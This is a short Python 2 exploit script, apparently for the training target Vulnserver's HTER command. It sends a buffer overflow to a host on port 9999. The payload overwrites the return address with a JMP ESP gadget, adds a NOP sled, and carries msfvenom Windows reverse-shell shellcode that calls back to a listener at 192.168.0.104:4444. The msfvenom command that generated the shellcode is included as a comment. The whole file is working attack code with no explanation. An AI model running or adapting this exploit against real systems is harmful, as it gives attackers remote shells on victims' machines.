import os
import socket
import sys

host= "192.168.0.101"
port= 9999

#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread  LHOST="192.168.0.104" LPORT=4444 -b "\x00" -f hex
shellcode=("ba5cbf405fdac1d97424f45d29c9b15231551283c5040309b1a2aa4d25a055adb6c5dc4887c5bb19b8f5c84f357d9c7bcef3098c67b96fa378924ca2fae98004c221d545035f1417dc2b8b876961102c216710d1f286314488d091675d69987f825452f4702265dc48cbca21653e126642a1619eb05c7265cabaf77d6c48af598c9d362a826a3c74876d910fb3e614df35bc32fb1e665a5afbc963bca4b6c1b749a27b9a0507b624d60fc157e49079ff4458a4f8ab731096557c61bf912831d73051da27bc844d7712772e27d227c62ddd18f64e37319db5d0fecab5489708b5993b8453f3d3c0cc6c4d49860d9247e30e186414c0e90106b5195c7410254a10feb411e089a48db7de1bc45df3027e430ed2b9c7d52747c6981c63d8649c2f8c38cbf97affa54bd4a91a02b02c5195c630bc6326806932592dfeb222539e3df9d7bedf2b225746be8f3a7915d342fa9facb0e2eaa9fda407c06e4127778e40")

#jmp esp
#625011af
crash = "HTER ." + "A"*2040 + "af115062" + "90"*40 + shellcode
conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
conn.send((crash))
print conn.recv(1024)
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()
